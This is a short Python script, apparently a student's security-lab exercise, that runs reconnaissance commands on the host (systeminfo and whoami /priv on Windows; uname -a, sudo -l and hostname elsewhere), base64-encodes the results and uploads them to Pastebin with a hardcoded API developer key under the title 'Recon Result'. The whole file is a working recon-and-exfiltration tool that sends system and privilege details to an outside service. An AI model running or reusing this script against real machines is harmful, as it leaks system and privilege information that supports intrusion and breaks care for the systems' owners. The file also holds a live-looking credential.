# Zia Kasyfi Nugroho
# 2301881581
# LB07

import subprocess
import requests
import base64
import os

results = []
operating_system = ""
cmd = []


def run_cmd(cmd):
    global results
    for i in cmd:
        try:
            process = subprocess.Popen(args=i, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            stdout, stderr = process.communicate()
            if stderr != b'':
                print(stderr)
            else:
                results.append(stdout.decode('utf-8'))
        except Exception as e:
            print(e)

    results = "\n".join(results)

    b64 = base64.b64encode(results.encode('utf-8'))
    upload_pastebin(b64)


def upload_pastebin(data):
    url = 'https://pastebin.com/api/api_post.php'
    api_dev_key = 'm_5rVVEvSFIOZMgdsg3-izIOcZKDYRnu'
    api_option = 'paste'
    api_paste_code = data
    api_paste_name = "Recon Result"

    try:
        r = requests.post(url, data={'api_dev_key': api_dev_key,
                                     'api_paste_code': api_paste_code,
                                     'api_paste_name': api_paste_name,
                                     'api_option': api_option})
        print("Uploading . . .")
        print("Uploaded: ", r.text)
    except:
        print("Error")


def main():
    global os
    operating_system = os.name
    if operating_system == "nt":
        cmd.append("systeminfo")
        cmd.append("whoami")
        cmd.append("whoami /priv")
    else:
        cmd.append("uname -a")
        cmd.append("sudo -l")
        cmd.append("hostname")
    run_cmd(cmd)


if __name__ == '__main__':
    main()
